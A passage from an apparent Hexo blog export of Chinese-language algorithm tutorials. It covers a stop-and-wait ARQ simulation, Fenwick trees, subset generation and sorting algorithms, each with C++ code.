				<span class="token keyword">if</span> <span class="token punctuation">(</span>isRight<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sender: 成功接收 ACK 帧，准备发送下一帧。"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
					<span class="token operator">++</span>itSender<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
					cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sender: 成功接收 NAK 帧，准备重传。"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 传输超时</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sender: 超时，准备重传。"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	ARQ arq<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span>myData<span class="token operator">></span> reciver<span class="token punctuation">;</span> <span class="token comment">// 初始时接收方为空</span>
	vector<span class="token operator">&lt;</span>myData<span class="token operator">></span> sender <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token function">myData</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">myData</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">myData</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 初始化发送方</span>
	arq<span class="token punctuation">.</span><span class="token function">transmitData</span><span class="token punctuation">(</span>reciver<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---------------------------------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"数据传输结束，以下为接收者收到的数据："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> s <span class="token operator">:</span> sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>bin <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span>str <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h1><p><img src="/2022/05/05/%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png"></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>动态前缀和数组：树状数组</title>
    <url>/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="前缀和的不足"><a href="#前缀和的不足" class="headerlink" title="前缀和的不足"></a>前缀和的不足</h1><p>前缀和是一种常见的算法思想，能够实现在常数时间复杂度下得到某个子区间内所有元素和。以一维数组 nums 为例，定义前缀和数组 preSum，<code>preSum[i]</code> 表示 nums 前 i 个元素的和，利用动态规划的思想，易得 <code>preSum[i] = preSum[i - 1] + nums[i]</code> 的递推关系，因此构造一个前缀和数组的时间复杂度为 O(n)，而查询前 i 个元素的和只需查询 <code>preSum[i]</code> 的值，为常数时间。</p>
<p>前缀和方法在数组元素不发生改变的情况下十分高效，但如果数组元素可能会发生改变，与朴素求和做法（不使用前缀和数组，而是直接遍历区间元素累计求和）相比，前缀和数组需要 O(n) 的时间来进行更新。这两种做法要么查询是 O(1)、更新是 O(n)，要么查询是 O(n)、更新是 O(1)，那有没有一种折衷的方案，使得查询和更新效率都不至于太低呢？本文将介绍的树状数组就符合这样的条件。</p>
<span id="more"></span>

<h1 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h1><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p>由正整数的二进制表示可知，任何一个正整数都可以拆分为为若干个不重复的 2 的幂之和。那么对于一个下标从 1 开始且长度为 n 的数组，它的任意下标 i (1 &lt;= i &lt; n) 也可以依照此方案进行拆分，例如 7 = 4 + 2 + 1，那么对于一个区间 [1 ~ 7]，令被拆分得到的各整数为区间长度，按照从大到小的顺序，依次从左到右对区间进行分割，得到的各子区间为 [1 ~ 4]、[5 ~ 6] 和 [7 ~ 7]。这样分割具备一个非常好的性质：</p>
<p><em>对于分割后得到的任何子区间 [l, r]，r 必定唯一，且 r 的个数正好等于 n.</em></p>
<p>也就是说不存在两个子区间 [l1, r1]、[l2, r2] 满足：r1 = r2 且 l1 ≠ l2. 那么就可以以 r 为关键字（下标），构造一个数组 tree，<code>tree[r]</code> 表示区间 [l, r] （若 r 确定，则 l 也确定）的元素和。那么根据 7 = 4 + 2 + 1，有 <code>preSum[7] = tree[4] + tree[6] + tree[7]</code>。如下图所示，图中给出了对下标 1 ~ 16 进行拆分的结果。</p>
<p><img src="/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/tree.png"></p>
<p>由于任何一个正整数 i 拆分后的整数数为其二进制表示中 1 的个数，令该个数为 ns，对于区间 [1, i]，其拆分得到区间个数也为 ns，即 <code>preSum[i]</code> 最多由 ns 个 tree 数组元素累加得到，因此前缀和的查询效率为 O(logn). </p>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>上图中的连接线代表了 nums 数组元素（黄色方格）和 tree 数组元素（蓝色方格）以及不同 tree 数组元素之间的相互依赖关系，若 nums 数组元素发生改变，便需要根据上述依赖关系自底向上对 tree 数组元素进行更新，以保证查询的正确性，问题就在于如何用规范的数学语言表示图中所示的依赖关系。</p>
<p>既然区间的分割主要基于二进制的位级表示，那么元素更新的依赖关系也不妨从二进制的角度出发。首先观察下标 9 的更新路径：9 -&gt; 10 -&gt; 12 -&gt; 16，其二进制表示分别为：</p>
<pre class="language-none"><code class="language-none"> 9: 01001
10: 01010
12: 01100
16: 10000</code></pre>

<p>似乎有 10 = 9 + 1，12 = 10 + 2，16 = 12 + 4 的关系存在。其中下标每次增加的值都为 2 的幂，且该 2 的幂即为当前下标 i 按上述规则拆分后得到的最小的数字。事实也的确如此（具备数学证明可以参考<a href="https://leetcode.cn/problems/range-sum-query-mutable/solutions/2524481/dai-ni-fa-ming-shu-zhuang-shu-zu-fu-shu-lyfll">带你发明树状数组！附数学证明</a>），这个最小数字通常称为一个数的 <strong>lowbit</strong>，即 <code>lowbit[9] = 1</code>、<code>lowbit[10] = 2</code>、<code>lowbit[12] = 4</code>。</p>
<p>得到这个规律后，更新操作便很容易了：若 <code>nums[i]</code> 改变，则首先更新 <code>tree[i]</code>，然后 <code>i += lowbit(i)</code>，继续更新 <code>tree[i]</code>，直到 i 超出了数组的范围，更新结束。注意到，<code>lowbit[i]</code> 在更新过程中是不断增大的，因此更新次数最多不超过 logn 次，即 tree 数组的更新效率为 O(logn).</p>
<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>了解了如何根据 tree 数组计算前缀和以及如何更新 tree 数组后，接下来的问题就是如何初始化 tree 数组的值。一个简单的做法是先将 tree 数组各元素初始化为 0，再依次对每个 <code>nums[i]</code> 执行更新操作，这种方法的时间复杂度为 O(nlogn)。</p>
<p>注意 tree 数组的下标代表分割区间的右端点位置，如果当前更新到了下标 i 的位置，那么说明 <code>tree[i]</code> 的值已经初始化完毕（<code>nums[j](j &gt; i)</code> 与 <code>tree[i]</code> 无关），因此可直接将该值加入 <code>tree[i + lowbit(i)]</code> 中。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">binaryIndexedTree</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token function">binaryIndexedTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">nums</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> next <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// i &amp; -i 即为 lowbit(i)</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>next <span class="token operator">&lt;=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				tree<span class="token punctuation">[</span>next<span class="token punctuation">]</span> <span class="token operator">+=</span> tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> dv <span class="token operator">=</span> val <span class="token operator">-</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
		nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> i <span class="token operator">&amp;</span> <span class="token operator">-</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			tree<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> dv<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">int</span> <span class="token function">preSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 区间 nums[0~idx) 的和</span>
		<span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>idx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			sum <span class="token operator">+=</span> tree<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
			idx <span class="token operator">-=</span> <span class="token punctuation">(</span>idx <span class="token operator">&amp;</span> <span class="token operator">-</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> sum<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>子集生成算法</title>
    <url>/2022/03/16/%E5%AD%90%E9%9B%86%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>本文介绍生成一个集合子集的两种常见算法，借此从中深入理解搜索问题中常见的两种思路。</p>
<span id="more"></span>

<h1 id="递归回溯"><a href="#递归回溯" class="headerlink" title="递归回溯"></a>递归回溯</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>对于集合中的每个元素，我们都有选择和不选择两种处理方式，这种思路类似于二叉树的遍历，每种情况都向下衍生出两种情况，最终当遍历到下标 <code>index = nums.size()</code> 时，将生成的子集保存。</p>
<p>由于此处我们使用一个数组的引用来保存子集元素，因此在递归回溯时，我们需要手动将上一步中加入添加的元素去除，来回溯到该元素未被选择的状态。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> Sets<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token function">search</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> subset<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			Sets<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>subset<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		subset<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">search</span><span class="token punctuation">(</span>subset<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		subset<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">search</span><span class="token punctuation">(</span>subset<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">getSubset</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> subset<span class="token punctuation">;</span>
		<span class="token function">search</span><span class="token punctuation">(</span>subset<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Sets<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>我们知道，一个集合的非空子集个数为 2<sup>n</sup> - 1，因此可以将子集状态表示为一个范围在 [1, 2<sup>n</sup>] 的二进制数。</p>
<p>二进制数位 ai 若为 0，表示第 i 位未被选中；若为 1，表示第 i 位被选中。而要分析一个压缩的状态，即获取表示该状态二进制数各位的值，可以运用位运算的操作。由于一个二进制数和 1 进行按位与（&amp;）操作得到的结果将只由该数的最低位决定，如果最低位为 0，则运算结果为 0，否则为 1. 由此可以想到，将一个状态数依次右移 n 位得到一个以 an 结尾的二进制数，再将该二进制数和 1 进行按位与得到 an 的值。依次遍历所有的右移步数得到该状态的所有信息。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> Sets<span class="token punctuation">;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">getSubset</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> subset<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			subset<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">int</span> isChoosed <span class="token operator">=</span> i <span class="token operator">>></span> j <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>isChoosed<span class="token punctuation">)</span>
					subset<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			Sets<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>subset<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> Sets<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>常见排序算法</title>
    <url>/2023/08/22/%E5%B8%B8%E8%A7%81%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><h2 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token operator">--</span>j<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="折半插入"><a href="#折半插入" class="headerlink" title="折半插入"></a>折半插入</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">binaryInsertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> key <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> low<span class="token punctuation">;</span> <span class="token operator">--</span>k<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
			nums<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> dk <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> dk <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> dk <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> dk<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> dk <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dk<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dk<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				j <span class="token operator">-=</span> dk<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

